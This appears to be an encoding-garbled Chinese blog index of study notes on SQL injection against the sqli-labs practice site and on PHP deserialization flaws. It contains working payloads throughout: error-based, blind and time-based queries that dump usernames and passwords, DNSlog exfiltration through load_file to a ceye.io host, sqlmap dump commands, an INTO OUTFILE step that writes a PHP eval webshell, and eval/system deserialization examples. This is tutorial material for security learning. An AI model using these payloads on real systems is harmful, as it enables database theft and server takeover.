#æœ‰å¤šå°‘è¡Œç”Ÿæˆå¤šå°‘ä¸ªéšæœºæ•°select floor(rand()*2); #éšæœº0æˆ–è€…1ï¼Œåªæœ‰ä¸¤ä¸ªç»“æœselect concat_ws('-',2,3) #2-3,æ‹¼æ¥select concat_ws('-',(select database()),floor(rand()*2)) #æ•°æ®åº“åå­—-0/1select concat_ws('-',(select database()),floor(rand()*2)) as a from users group by a; #åˆ†ç»„select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand()*2)) as a from users group by a; #æ‰§è¡Œä¸æ˜¯æ¯æ¬¡æŠ¥é”™select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand(0)*2)) as a from users group by a; #rand()æ”¹æˆrand(0)å°±ä¼šå›ºå®šæŠ¥é”™ï¼Œæ”¹æˆ1å°±ä¼šä¸æŠ¥é”™select count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a;#è¾“å‡ºåº“å?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2)) as a from users group by a --+#è·å–è¡¨åless-5?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(username,':',password) from users), floor(rand(0)*2)) as a from users group by a --+#group_concatæ— æ³•æ˜¾ç¤ºï¼Œå¯ä»¥ä½¿ç”¨concat?id=-1' union select 1, count(*), concat_ws('-', (select concat(username,':',password) from users limit 0,1), floor(rand(0)*2)) as a from users group by a --+#æŸ¥æœ€ç»ˆæ•°æ® è¿™æ˜¯åˆ†ç»„ æŸ¥æœ€ç»ˆæ•°æ® updatexmlæ³¨å…¥å‡½æ•°updatexml(XML_document,XPath_string,new_value)åŒ…å«ä¸‰ä¸ªå‚æ•°ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML documentæ˜¯stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œä¾‹å¦‚Docç¬¬äºŒä¸ªå‚æ•°ï¼šXPath stringæ˜¯è·¯å¾„ï¼ŒXPath:æ ¼å¼çš„å­—ç¬¦ä¸²ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_value,stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® updatexml æ­£å¸¸å¥å¼ 1select updatexml(doc,'/book/auther/surname','1') from xml; é”™è¯¯å¥å¼ 1select updatexml(doc,'~book/auther/surname','1') from xml; æŸ¥æ•°æ®åº“ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼šå¼•èµ·æŠ¥é”™ï¼Œä»è€Œå›æ˜¾æ•°æ®åº“åå­— 1?id=1&quot; and 1=updatexml(1,concat('~',(select database())),3) --+ æŸ¥æ•°æ®è¡¨ 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+ æŸ¥åˆ— 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) --+ ç„¶åæŸ¥åˆ°è¿™äº›ä¸ªåˆ—åï¼Œæœ€åæŸ¥æ•°æ® 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(id,username,password) from users)),3) --+ è¿™ä¸ªé™åˆ¶é•¿åº¦äº†ï¼Œç”¨substringä¿®æ”¹ä»¥ä¸‹ 1?id=1&quot; and 1=updatexml(1,concat('~',substring((select group_concat(id,username,password) from users),1,30)),3) --+ ç›²æ³¨å¸ƒå°”ç›²æ³¨ç›²æ³¨ï¼šé¡µé¢æ²¡æœ‰æŠ¥é”™å›æ˜¾ä½ï¼Œä¸çŸ¥é“æ•°æ®åº“å…·ä½“è¿”å›å€¼çš„æƒ…å†µä¸‹ï¼Œå¯¹æ•°æ®åº“å†…å®¹è¿›è¡ŒçŒœè§£ï¼Œå®è¡ŒSQLæ³¨å…¥ ç›²æ³¨åˆ†ç±»ï¼šå¸ƒå°”ç›²æ³¨ï¼Œæ—¶é—´ç›²æ³¨ï¼ŒæŠ¥é”™æ³¨å…¥ å¸ƒå°”ç›²æ³¨ï¼šwebé¡µé¢åªè¿”å›TrueçœŸï¼ŒFlaseå‡ä¸¤ç§ç±»å‹ã€‚åˆ©ç”¨é¡µé¢è¿”å›ä¸åŒï¼Œé€ä¸ªçŒœè§£æ•°æ® ç”¨å¦‚ä¸‹è¯­å¥åˆ¤æ–­æ˜¯å¦æ˜¯å¸ƒå°”ç›²æ³¨ 1?id=1' and 1=1 --+ å›å¤ä¸ºçœŸ 1?id=1' and 1=2 --+ å›å¤ä¸ºå‡ æ‰‹åŠ¨æ³¨å…¥æ‰¾åˆ°waf å…³é”®å‡½æ•°å‡½æ•°ascii() asciiç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼Œå¯ä»¥æŠŠå­—æ¯è½¬æ¢æˆå¯¹åº”æ•°å­— 1select ascii('A') 1234?id=1' and ascii(substr((select database()),1,1))&gt;=101 --+(select database())substr((select database()),1,1)ascii(substr((select database()),1,1)) å¤§äºç­‰äº115å¯ä»¥116ä¸è¡Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯115 ç¬¬äºŒä¸ªå­—ç¬¦ 1?id=1' and ascii(substr((select database()),2,1))&gt;=101 --+ ä¾æ¬¡å»è¯• 1?id=1'and ascii(substr('abcd',1,1))&gt;97 --+ æŠŠabcdæ›¿æ¢æˆè¦æŸ¥è¯¢çš„è¯­å¥å³å¯ æŸ¥è¡¨ålimit 0,1 è¡¨ç¤ºè·å–ç¬¬ 1 ä¸ªè¡¨å 12?id=1' and ascii(substr((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),1,1))&gt;100 --+ æŸ¥åˆ—å 12?id=1' and ascii(substr((select column_name from information_schema.columns wheretable_schema=database() and table_name='users' limit 0,1),1,1))&gt;100 --+ æŸ¥æ•°æ® 12?id=1' and ascii(substr((select username from users limit 0,1),1,1))&gt;100 --+?id=1' and ascii(substr((select password from users limit 0,1),1,1))&gt;100 --+ æ—¶é—´ç›²æ³¨æ—¶é—´ç›²æ³¨ï¼šwebé¡µé¢åªè¿”å›ä¸€ä¸ªæ­£å¸¸é¡µé¢ï¼Œåˆ©ç”¨é¡µé¢å“åº”æ—¶é—´ä¸åŒé€ä¸ªçŒœè§£æ•°æ® å‰ææ˜¯æ•°æ®åº“ä¼šæ‰§è¡Œå‘½ä»¤ä»£ç ï¼Œåªæ˜¯ä¸åé¦ˆé¡µé¢ä¿¡æ¯ å‰ææ˜¯æ•°æ®åº“ä¼šæ‰§è¡Œå‘½ä»¤ä»£ç ï¼Œåªæ˜¯ä¸åé¦ˆé¡µé¢ä¿¡æ¯ å…³é”®å‡½æ•°å‡½æ•°sleep() å‚æ•°ä¸ºä¼‘çœ æ—¶é•¿ï¼Œä»¥ç§’ä¸ºå•ä½ï¼Œå¯ä»¥ä¸ºå°æ•° 1select sleep(2) less-9è¾“å…¥ 1?id=1 ä»–æ˜¯å¯¹çš„ç„¶ååé¢éšä¾¿è¾“ä¸ä¼šå˜ 1?id=1 and sleep(3) --+ å¦‚æœæ˜¯æ•°å­—å‹ï¼Œå¥¹ä¼šå»¶è¿Ÿ3ç§’æ‰æ˜¾ç¤ºï¼Œè¿™é‡Œå®ƒç«‹é©¬å°±å›æ˜¾äº†ï¼Œæ˜¾ç„¶ä¸æ˜¯æ•°å­—å‹ ç„¶ååˆ¤æ–­æ˜¯ä»€ä¹ˆé—­åˆ,å¯ä»¥çœ‹åˆ°å•å¼•å·ç­‰äº†3ç§’æ‰å›æ˜¾ï¼Œè¯´æ˜å•å¼•å·é—­åˆ 1select if(1=1,sleep(0),sleep(3)); è¿™å¥è¯çš„æ„æ€æ˜¯1=1ä¸ºçœŸå°±æ‰§è¡Œä¼‘çœ 0ç§’ 1?id=1' and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+ æ¯”å¤§å°çŒœè§£ï¼Œç„¶åé€šè¿‡æ—¶é—´å“åº”åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ æœ€ç»ˆå¾—åˆ°æ•°æ®åº“åå­—çš„é¦–å­—æ¯æ˜¯114rd æŸ¥è¯¢è¡¨ 1234?id=1' and if(ascii(substr ((table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1' and if(ascii(substr ((column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1'and if(ascii(substr((select username from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+?id=1' and if(ascii(substr((select password from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+ dnslogæ³¨å…¥ç›²æ³¨çš„ä¸€ç§ï¼Œsqlmapï¼Œæ¯”ç›²æ³¨æ•ˆç‡è¦é«˜,å¯ä»¥ä¸€ç»„ä¸€ç»„ï¼Œä¸€è¡Œä¸€è¡Œçš„å‡ºæ¥ å¯¹å½“å‰æœåŠ¡å™¨è¯»å†™çš„æƒé™è¦æ‰“å¼€å¦‚æœä¸èƒ½åšSQLæ³¨å…¥æ–‡ä»¶ä¸Šä¼ ï¼Œé‚£ä¹ˆè¿™ä¸ªä¹Ÿåšä¸äº† 1select load_file(&quot;C:\\\\benben.txt&quot;); UNCè·¯å¾„æ ¼å¼ï¼šservername\\sharename,å…¶ä¸­servername:æ˜¯æœåŠ¡å™¨åã€‚sharenameæ˜¯å…±äº«èµ„æºçš„åç§°ã€‚ç›®å½•æˆ–æ–‡ä»¶çš„UNCåç§°å¯ä»¥åŒ…æ‹¬å…±äº«åç§°ä¸‹çš„ç›®å½•è·¯å¾„ï¼Œæ ¼å¼ä¸ºï¼š\\servername\\sharename\\directory \\filenameã€‚å…¶å®æˆ‘ä»¬å¹³å¸¸åœ¨Vidnowsä¸­ç”¨å…±äº«æ–‡ä»¶çš„æ—¶å€™å°±ä¼šç”¨åˆ°è¿™ç§ç½‘ç»œåœ°å€çš„å½¢å¼sss.xxxltest æŸ¥çœ‹æœ¬åœ°æ–‡ä»¶ å…ˆæŸ¥æ•°æ®åº“ 1?id=1'and select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;1.j96k1p.ceye.io\\\\1.txt&quot;))--+ æŸ¥æ•°æ®è¡¨ 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ è¿™é‡Œlimit 0ï¼Œ1æ˜¯æ˜¾ç¤ºç¬¬ä¸€ä¸ªè¡¨åemails æ˜¯ä»0å¼€å§‹åªæ˜¾ç¤ºä¸€ä¸ªlimit 1,1 æ˜¯ä»1å¼€å§‹åªæ˜¾ç¤ºä¸€ä¸ª åˆ—å 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ å·¥å…·æ³¨å…¥DnslogSqlinj 1234567891011121314151617181920Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+Options: --version show program's version number and exit -h, --help show this help message and exit -n TASKNAME, --name=TASKNAME task name -t THREAD_COUNT, --thread=THREAD_COUNT thread_count -u URL, --url=URL target include injection -i INF, --inf=INF Testing target and Try to get information --dbs get database -D DB database name --tables get table -T TABLE table name --columns get column -C COLUMN column name --dump get **data**D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://sqli:8088/Less-9/?id=1' and ({})--+&quot;D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+&quot; -D security --tables 1sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot; -D security -T users -C username,password --dump --time-sec 2 sqlæ³¨å…¥æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ä¸Šä¼ æ‹¿webshell åˆ¤æ–­mysqlæ˜¯å¦æœ‰æ–‡ä»¶è¯»å†™æƒé™ 12show variables like '%secure%';#ç”¨æ¥æŸ¥çœ‹mysqlæ˜¯å¦æœ‰è¯»å†™æ–‡ä»¶æƒé™ è¿™é‡ŒNULLæ˜¯æ²¡æœ‰æ–‡ä»¶è¯»å†™æƒé™çš„æˆ‘ä»¬åœ¨mysqlä¸‹é¢çš„my.iniæ–‡ä»¶é‡Œé¢çš„[mysqld]ç»„ä¸‹é¢åŠ ä¸€è¡Œ 1secure_file_priv=&quot;&quot; ç„¶åå°±æœ‰æ–‡ä»¶è¯»å†™æƒé™äº† 1.show variables likeâ€™%secure%â€™;ç”¨æ¥æŸ¥çœ‹mysqlæ˜¯å¦æœ‰è¯»å†™æ–‡ä»¶æƒé™ï¼›2.æ•°æ®åº“çš„fleæƒé™è§„å®šäº†æ•°æ®åº“ç”¨æˆ·æ˜¯å¦æœ‰æƒé™ï¼Œå‘æ“ä½œç³»ç»Ÿå†…å†™å…¥å’Œè¯»å–å·²å­˜åœ¨çš„æƒé™ï¼›3.into outfileå‘½ä»¤ä½¿ç”¨çš„ç¯å¢ƒï¼šå¿…é¡»çŸ¥é“ä¸€ä¸ªï¼ŒæœåŠ¡å™¨ä¸Šå¯ä»¥å†™å…¥æ–‡ä»¶çš„æ–‡ä»¶å¤¹çš„å®Œæ•´è·¯å¾„ã€‚ less-7ä¸¤ä¸ªåŒå¼•å·ä¸æŠ¥é”™çš„åŸå› æ˜¯å› ä¸ºåŒå¼•å·è¢«ä¸¤ä¸ªå•å¼•å·é—­åˆï¼Œå¤±å»å•å¼•å·çš„ä½œç”¨æ˜¯å¦‚ä¸‹é—­åˆæ–¹å¼ 1?id=1')) æœ‰ä¸ªæ³•å­å¯ä»¥åˆ¤æ–­åˆ°åº•æ˜¯ä¸æ˜¯ä¸¤ä¸ªå•å¼•å·é—­åˆ 1?id=1'' and 1=2 --+ è¿™æ˜¾ç„¶æ˜¯ä¸æˆç«‹çš„ï¼Œä½†æ˜¯ä»»ç„¶ä¸æŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°é‚£ä¹ˆè¿™å°±ä¸æ˜¯ä¸¤ä¸ªå•å¼•å·é—­åˆ 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\ben.php&quot;--+ &lt;?php@eval($_POST['password]);?&gt;ä¸ºä¸€å¥è¯æœ¨é©¬passwordä¸ºé¢„ç•™å¯†ç D:\\\\phpstudy._pro\\\\WWWW\\\\ä¸ºæ–‡ä»¶è·¯å¾„ben.phpä¸ºæ–°æ’å…¥çš„æ–‡ä»¶å 1?id=-1')) union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\Soft\\\\Penetration\\\\TrafficTools\\\\phpStudy\\\\WWW\\\\ben.php&quot; --+ è¿™é‡Œå†™å¥½æ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç„¶åç”¨èšå‰‘è¿æ¥è¿™é‡Œè¿æ¥åœ°å€å°±æ˜¯ 1http://localhost/ben.php æŸ¥çœ‹æƒé™ï¼Œè¿™æ˜¯æœ¬æœºçš„ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ· linuxçš„è¯æ˜¯ 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&quot;,3 into outfile &quot;/var/www/heml/test/ben.php&quot;--+ ä¸Šä¼ å¤§é©¬åå¼¹æ‹¿web shell","link":"/2025/12/11/Sql%E6%B3%A8%E5%85%A5/"},{"title":"","text":"phpååºåˆ—åŒ–åŸç† å‰ç½®1.phpé¢å‘å¯¹è±¡2.åºåˆ—åŒ–åŸºç¡€çŸ¥è¯† æ ¼å¼åŒ–å‡ºæ¥ä¸ä¸€æ · åºåˆ—åŒ–æ ¼å¼3.é­”æœ¯æ–¹æ³•è§¦å‘æ¡ä»¶ 4.popé“¾çš„æ„é€ æ€è·¯ 1å†™pocä»£ç  5.ååºåˆ—åŒ–é€ƒé€¸ 6.sessionååºåˆ—åŒ–æ¼æ´ 7.pharååºåˆ—åŒ– ä¸ºåè®®è¯»å–pharï¼Œå­—æ®µé‡Œé¢çš„å­—ç¬¦ä¸²è‡ªåŠ¨ååºåˆ—åŒ– æ–‡ä»¶ä¸Šä¼ ï¼Œé­”æœ¯æ–¹æ³•è§¦å‘ é¢å‘å¯¹è±¡çš„åŸºæœ¬æ¦‚å¿µé¢å‘è¿‡ç¨‹:åƒç•ªèŒ„ç‚’è›‹,è‡ªå·±ç‚’é¢å‘å¯¹è±¡:ç‚¹é¤ç•ªèŒ„ç‚’è›‹ é¢å‘å¯¹è±¡å°±æ˜¯å·²ç»åšå¥½äº†çš„ é¢å‘å¯¹è±¡çš„ä¸‰ä¸ªç‰¹æŠ˜:å¯¹è±¡çš„è¡Œä¸ºï¼Œå¯¹è±¡çš„å½¢æ€ï¼Œå¯¹è±¡çš„è¡¨ç¤º; ç±»çš„å®šä¹‰ 1234ç±»æ˜¯å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ï¼Œå®ƒå°†æ•°æ®çš„å½¢å¼ä»¥åŠè¿™äº›æ•°æ®ä¸Šçš„æ“ä½œå°è£…åœ¨ä¸€èµ·ã€‚å¯¹è±¡æ˜¯å…·æœ‰ç±»ç±»å‹çš„å˜é‡ï¼Œæ˜¯å¯¹ç±»çš„å®ä¾‹ã€‚å†…éƒ¨æ„é€ :æˆå‘˜å˜é‡(å±æ€§)+æˆå‘˜å‡½æ•°(æ–¹æ³•) 123å±æ€§ï¼šå®šä¹‰åœ¨ç±»å†…éƒ¨çš„å˜é‡ï¼Œè¯¥å˜é‡çš„å€¼å¯¹å¤–æ˜¯ä¸å¯è§çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æˆå‘˜å‡½æ•°è®¿é—®ï¼Œåœ¨ç±»è¢«å®ä¾‹åŒ–ä¸ºå¯¹è±¡åï¼Œè¯¥å˜é‡å³å¯æˆä¸ºå¯¹è±¡çš„å±æ€§ã€‚æ–¹æ³•ï¼šå®šä¹‰åœ¨ç±»çš„å†…éƒ¨ï¼Œå¯ç”¨äºè®¿é—®å¯¹è±¡çš„æ•°æ® æˆå‘˜å‡½æ•°æ˜¯å¯ä»¥è®¿é—®æˆå‘˜å˜é‡çš„ 12345678910111213141516&lt;?php highlight_file(__FILE__); class hero{ public $name='chengyaojin'; private $sex='man'; protected $shengao='165'; function jineng($var1) { echo $this-&gt;name; echo $var1; } } $cyj= new hero(); echo $cyj-&gt;name.&quot;&lt;br /&gt;&quot;; echo $cyj-&gt;sex.&quot;&lt;br /&gt;&quot;; echo $cyj-&gt;shengao.&quot;&lt;br /&gt;&quot;; ?&gt; hero çˆ¶ç±»ã€hero2 å­ç±» 12345678å…¬å…±çš„ç§æœ‰çš„å—ä¿æŠ¤çš„ï¼šå†…éƒ¨ã€å­ç±»å¯ç”¨publicå­ç±»å¯ç”¨privateå­ç±»ä¸å¯ç”¨protectedå­ç±»å¯ç”¨å¤–éƒ¨åªå¯ç”¨publicå­ç±»å†…éƒ¨å¯ç”¨publicå’Œprotected ååºåˆ—åŒ–åŸºç¡€çŸ¥è¯†1234567891011åºåˆ—åŒ–çš„ä½œç”¨åºåˆ—åŒ–çš„è¡¨è¾¾æ–¹å¼/æ ¼å¼æ–¹ä¾¿å­˜å‚¨æ–¹ä¾¿æ•°æ®ä¼ è¾“ç©ºå­—ç¬¦ null N;æ•´å‹ 666 i:666;æµ®ç‚¹å‹ 66.6 d:66.6Boolean true b:1; flase b:0;å­—ç¬¦ä¸² 'benben' s:6é•¿åº¦:&quot;benben&quot;; å­—ç¬¦ä¸²åºåˆ—åŒ– 123456&lt;?php $a='benben'; echo serialize($a);#s:6:&quot;benben&quot;; æ•°ç»„åºåˆ—åŒ– 12345&lt;?php $a=array('benben','dazhaung','laoliu'); echo serialize($a);# a:3:{i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhaung&quot;;i:2;s:6:&quot;laoliu&quot;;} a:3æ˜¯ä¸‰ä¸ªæ•°ç»„å…ƒç´ i:0æ˜¯ç¼–å·s:6:â€benbenâ€;æ˜¯æŒ‡benbené•¿åº¦ä¸º6i:1æ˜¯ç¼–å· å¯¹è±¡åºåˆ—åŒ– 123456789101112&lt;?phphighlight_file(__FILE__);class test{ public $pub='benben'; function jineng(){ echo $this-&gt;pub; }}$a = new test();echo serialize($a);?&gt;# O:4:&quot;test&quot;:1:{s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;} O:4:ç±»åé•¿åº¦â€œtestâ€ç±»å:1å˜é‡æ•°é‡:{s:3å˜é‡åé•¿åº¦:â€pubâ€å˜é‡åå­—;s:6 $pubå€¼çš„é•¿åº¦:â€benbenå˜é‡å€¼â€;} å±æ€§ä¸ä¸€æ ·ï¼Œåºåˆ—åŒ–ç»“æœä¹Ÿä¸ä¸€æ ·ç§æœ‰ä¿®é¥°ç¬¦ 123456789101112&lt;?phphighlight_file(__FILE__);class test{ private $pub='benben'; function jineng(){ echo $this-&gt;pub; }}$a = new test();echo serialize($a);?&gt;# O:4:&quot;test&quot;:1:{s:9:&quot;testpub&quot;;s:6:&quot;benben&quot;;} private $pub= pubå‰é¢åŠ äº†testå˜æˆtestpubtestæ˜¯ç±»ås:9ä¸ºä»€ä¹ˆæ˜¯9ï¼Ÿå› ä¸ºç±»åtestå‰åå„åŠ äº†ä¸€ä¸ª%00(null,ç©ºå­—ç¬¦) 1O:4:&quot;test&quot;:1:{s:9:&quot;testpub&quot;;s:6:&quot;benben&quot;;} O%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D æˆå‘˜å±æ€§è°ƒç”¨å¯¹è±¡ 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);class test{ var $pub='benben'; function jineng(){ echo $this-&gt;pub; }}class test2{ var $ben; function __construct(){ $this-&gt;ben=new test(); }}$a = new test2();echo serialize($a);?&gt;# O:5:&quot;test2&quot;:1:{s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:{s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;}}#åºåˆ—åŒ–é‡Œçš„å¯¹è±¡åŒ…å«äº†ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡O:4:&quot;test&quot;:1:{s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;} ååºåˆ—åŒ–çŸ¥è¯†ååºåˆ—åŒ–ä¹‹åçš„å†…å®¹æ˜¯ä¸€ä¸ªå¯¹è±¡ååºåˆ—åŒ–ç”Ÿæˆçš„å¯¹è±¡é‡Œçš„å€¼ï¼Œç”±ååºåˆ—åŒ–é‡Œçš„å€¼æä¾›ï¼Œä¸åŸæœ‰ç±»é¢„å®šä¹‰çš„å€¼æ— å…³ååºåˆ—åŒ–ä¸è§¦å‘ç±»çš„æˆå‘˜æ–¹æ³•ï¼›éœ€è¦è°ƒç”¨æ–¹æ³•åæ‰èƒ½è§¦å‘ å°†ååºåˆ—åŒ–åçš„å‚æ•°è¿˜åŸæˆå®ä¾‹åŒ–çš„å¯¹è±¡ 123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);class test { public $a = 'benben'; protected $b = 666; private $c = false; public function displayVar() { echo $this-&gt;a; }}$d = new test();$d = serialize($d);echo $d.&quot;&lt;br /&gt;&quot;;echo urlencode($d).&quot;&lt;br /&gt;&quot;;$a = urlencode($d);$b = unserialize(urldecode($a));var_dump($b);?&gt;O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;s:6:&quot;benben&quot;;s:4:&quot;*b&quot;;i:666;s:7:&quot;testc&quot;;b:0;}O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22benben%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A666%3Bs%3A7%3A%22%00test%00c%22%3Bb%3A0%3B%7Dobject(test)#1 (3) { [&quot;a&quot;]=&gt; string(6) &quot;benben&quot; [&quot;b&quot;:protected]=&gt; int(666) [&quot;c&quot;:&quot;test&quot;:private]=&gt; bool(false) }var_dump($d);class test#1 (3) { public $a =&gt; string(6) &quot;benben&quot; protected $b =&gt; int(666) private $c =&gt; bool(false)} ååºåˆ—åŒ–æ¼æ´ä¾‹é¢˜ååºåˆ—åŒ–ç”Ÿæˆçš„å¯¹è±¡é‡Œçš„å€¼ï¼Œç”±ååºåˆ—åŒ–é‡Œçš„å€¼æä¾›ï¼šä¸åŸæœ‰ç±»é¢„å®šä¹‰çš„å€¼æ— å…³ï¼šååºåˆ—åŒ–æ¼æ´çš„æˆå› ï¼šååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œunserialize()æ¥æ”¶çš„å€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰å¯æ§ï¼›é€šè¿‡æ›´æ”¹è¿™ä¸ªå€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œå¾—åˆ°æ‰€éœ€è¦çš„ä»£ç ï¼Œå³ç”Ÿæˆçš„å¯¹è±¡çš„å±æ€§å€¼ã€‚ååºåˆ—åŒ–ä¸æ”¹å˜ç±»çš„æˆå‘˜æ–¹æ³•ï¼›éœ€è¦è°ƒç”¨æ–¹æ³•åæ‰èƒ½è§¦å‘é€šè¿‡è°ƒç”¨æ–¹æ³•ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚ 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class test{ public $a = 'echo &quot;this is test!!&quot;;'; public function displayVar() { eval($this-&gt;a); }}$get = $_GET[&quot;benben&quot;];$b = unserialize($get);$b-&gt;displayVar() ;?&gt; 12345678910111213141516&lt;?php class test{ public $a = &quot;system('ls');&quot;; public function displayVar() { eval($this-&gt;a); } } //$get = 'O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:13:&quot;system('ls');&quot;;}'; //$b = unserialize($get); //var_dump($b); //$b-&gt;displayVar() ; echo serialize(new test()); ?&gt;# O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:13:&quot;system('ls');&quot;;} ç®€æ´ç‰ˆ 1234567&lt;?phpclass test{ public $a = 'system(&quot;whoami&quot;);';}$obj = new test();echo serialize($obj);?&gt; 1?benben=O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;} é­”æœ¯æ–¹æ³•12å®ä¾‹åŒ–å¯¹è±¡ä¼šè°ƒç”¨constructé”€æ¯å¯¹è±¡ä¼šè°ƒç”¨destruct __destructè°ƒç”¨äº†ä¸¤æ¬¡destructä¸ºä»€ä¹ˆï¼Ÿ1.å…ˆé”€æ¯ã€Œååºåˆ—åŒ–ç”Ÿæˆçš„åŒ¿åå¯¹è±¡ã€â†’ è§¦å‘ç¬¬ä¸€æ¬¡ææ„ï¼›2.å†é”€æ¯ $test æŒ‡å‘çš„åŸå§‹å¯¹è±¡ â†’ è§¦å‘ç¬¬äºŒæ¬¡ææ„ï¼› 123456789101112&lt;?php class User { public function __destruct() { echo &quot;è§¦å‘äº†ææ„å‡½æ•°1æ¬¡&quot;.&quot;&lt;br /&gt;&quot; ; } } $test = new User(&quot;benben&quot;); $ser = serialize($test); unserialize($ser); ?&gt; 1234567891011121314&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { var $cmd = &quot;echo 'dazhuang666!!';&quot; ; public function __destruct() { eval ($this-&gt;cmd); }}$ser = $_GET[&quot;benben&quot;];unserialize($ser);?&gt; 1234567891011&lt;?php class User { var $cmd = &quot;phpinfo();&quot;; public function __destruct() { eval ($this-&gt;cmd); } } echo serialize(new User());# O:4:&quot;User&quot;:1:{s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;} sleepåºåˆ—åŒ–çš„æ—¶å€™ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleepå…ˆæ‰§è¡Œsleepåœ¨åºåˆ—åŒ– è§¦å‘æ—¶æœºï¼šåºåˆ—åŒ–serialize()ä¹‹å‰åŠŸèƒ½ï¼šå¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚å‚æ•°ï¼šæˆå‘˜å±æ€§è¿”å›å€¼ï¼šéœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ sleepä¾‹é¢˜ 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { const SITE = 'uusama'; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } public function __sleep() { system($this-&gt;username); }}$cmd = $_GET['benben'];$user = new User($cmd, 'b', 'c');echo serialize($user);?&gt; å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ __wakeup()åœ¨ååºåˆ—åŒ–ä¹‹å‰__destructåœ¨ååºåˆ—åŒ–ä¹‹å wakeup 12345678910111213141516171819202122232425262728293031323334353637&lt;?php highlight_file(__FILE__); error_reporting(0); class User { const SITE = 'uusama'; public $username; public $nickname; private $password; private $order; 